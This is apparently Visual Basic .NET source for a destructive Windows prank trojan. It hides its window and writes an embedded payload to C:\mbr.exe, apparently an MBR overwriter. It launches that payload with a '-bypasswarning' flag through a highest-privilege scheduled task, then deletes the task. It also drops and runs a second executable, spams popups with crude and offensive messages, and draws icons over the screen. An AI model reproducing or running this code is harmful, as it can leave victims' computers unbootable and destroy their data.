Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.Windows.Forms
Imports System.Math
Imports System.Windows.Forms.VisualStyles.VisualStyleElement
Imports System.Windows.Forms.VisualStyles.VisualStyleElement.Rebar
Imports System.IO

Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Module1.main()
    End Sub
End Class

Module Module1
    Dim error1 = "GET REKT"
    Dim error2 = "SKIVIDI DOP DOP"
    Dim error3 = "idkwhattoputhere"
    Dim error4 = "sowy clutter for you ears before (┬┬﹏┬┬)"
    Dim error5 = "n word written here!!!"
    Dim error6 = "sigma alpha skibidi pomni"
    Dim error7 = "LEVEL 100 GYATT JUICY ASS"
    Dim timer As New System.Timers.Timer()
    Dim timeri As New System.Timers.Timer()
    Dim timera As New System.Timers.Timer()

    <DllImport("user32.dll", SetLastError:=True)>
    Private Function GetDC(ByVal hWnd As IntPtr) As IntPtr
    End Function

    <DllImport("user32.dll", SetLastError:=True)>
    Private Function ReleaseDC(ByVal hWnd As IntPtr, ByVal hDC As IntPtr) As Integer
    End Function

    <DllImport("gdi32.dll", SetLastError:=True)>
    Private Function SelectObject(ByVal hdc As IntPtr, ByVal h As IntPtr) As IntPtr
    End Function

    <DllImport("gdi32.dll", SetLastError:=True)>
    Private Function DeleteObject(ByVal hObject As IntPtr) As Boolean
    End Function

    Private Declare Function LoadIcon Lib "user32.dll" Alias "LoadIconA" (ByVal hInstance As IntPtr, ByVal lpIconName As IntPtr) As IntPtr
    Private Declare Function DrawIcon Lib "user32.dll" (ByVal hdc As IntPtr, ByVal x As Integer, ByVal y As Integer, ByVal hIcon As IntPtr) As Boolean
    Private Declare Function SetProcessDPIAware Lib "user32.dll" () As Boolean

    Private ReadOnly IconIDs As Integer() = {32513, 32514, 32515, 32516, 32517}

    Dim hdc As IntPtr
    Dim w, h As Integer

    <DllImport("user32.dll")>
    Private Function GetDesktopWindow() As IntPtr
    End Function

    <DllImport("gdi32.dll")>
    Private Function BitBlt(ByVal hdcDest As IntPtr, ByVal nXDest As Integer, ByVal nYDest As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal hdcSrc As IntPtr, ByVal nXSrc As Integer, ByVal nYSrc As Integer, ByVal dwRop As Integer) As Boolean
    End Function

    ' Declare function to get system metrics using Win32 API
    <DllImport("user32.dll", SetLastError:=True)>
    Private Function GetSystemMetrics(ByVal smIndex As Integer) As Integer
    End Function

    <DllImport("user32.dll")>
    Private Function GetWindowDC(ByVal hwnd As IntPtr) As IntPtr
    End Function

    Sub main()
        File.WriteAllBytes("C:\mbr.exe", My.Resources.mbr)
        Dim programPath As String = "C:\mbr.exe"
        Dim arguments As String = "-bypasswarning"

        Dim startInfo As New ProcessStartInfo()
        startInfo.FileName = "schtasks"
        startInfo.Arguments = $"/create /tn ""RunMBR"" /tr ""{programPath} {arguments}"" /sc once /st 00:00 /rl HIGHEST /f"
        startInfo.UseShellExecute = False
        startInfo.RedirectStandardOutput = True
        startInfo.RedirectStandardError = True

        Using process As Process = Process.Start(startInfo)
            Dim output As String = process.StandardOutput.ReadToEnd()
            Dim [error] As String = process.StandardError.ReadToEnd()
            process.WaitForExit()
            If process.ExitCode = 0 Then
                startInfo.Arguments = "/run /tn ""RunMBR"""
                Using runProcess As Process = Process.Start(startInfo)
                    runProcess.WaitForExit()
                End Using
                startInfo.Arguments = "/delete /tn ""RunMBR"" /f"
                Using deleteProcess As Process = Process.Start(startInfo)
                    deleteProcess.WaitForExit()
                End Using
            Else
                Console.WriteLine("Error creating scheduled task: " & [error])
            End If
        End Using

        Dim windowMaker As New WindowMaker()
        windowMaker.Create("gooner rce", "ay your pc is fucked", My.Computer.Screen.Bounds.X / 2, My.Computer.Screen.Bounds.Y / 2)
        SetProcessDPIAware()

        hdc = GetDC(IntPtr.Zero)

        If hdc = IntPtr.Zero Then
            MessageBox.Show("Failed to get device context!")
            Exit Sub
        End If

        waves()

        timer.Interval = 700
        AddHandler timer.Elapsed, AddressOf cze
        timer.Start()

        timeri.Interval = 100
        AddHandler timeri.Elapsed, AddressOf errors
        timeri.Start()
    End Sub

    Sub waves()
        File.WriteAllBytes("C:\waves.exe", My.Resources.waves)
        Process.Start("C:\waves.exe")
    End Sub

    Sub cze()
        Dim rand As New Random()
        Dim randomNumber As Integer = rand.Next(1, 8)
        Dim windowa As New WindowMaker()

        Dim randx As Integer = rand.Next(0, My.Computer.Screen.Bounds.Width)
        Dim randy As Integer = rand.Next(0, My.Computer.Screen.Bounds.Height)

        Dim errorMessage As String = ""

        Select Case randomNumber
            Case 1 : errorMessage = error1
            Case 2 : errorMessage = error2
            Case 3 : errorMessage = error3
            Case 4 : errorMessage = error4
            Case 5 : errorMessage = error5
            Case 6 : errorMessage = error6
            Case 7 : errorMessage = error7
        End Select

        windowa.Create("gooner rce", errorMessage, randx, randy)
    End Sub

    Private Function GetRandomIconID() As Integer
        Dim rand As New Random()
        Dim index As Integer = rand.Next(0, IconIDs.Length)
        Return IconIDs(index)
    End Function

    Sub errors()
        If hdc = IntPtr.Zero Then
            Exit Sub
        End If

        DrawIcon(hdc, Cursor.Position.X - 20, Cursor.Position.Y - 20, LoadIcon(IntPtr.Zero, New IntPtr(GetRandomIconID())))
    End Sub
End Module
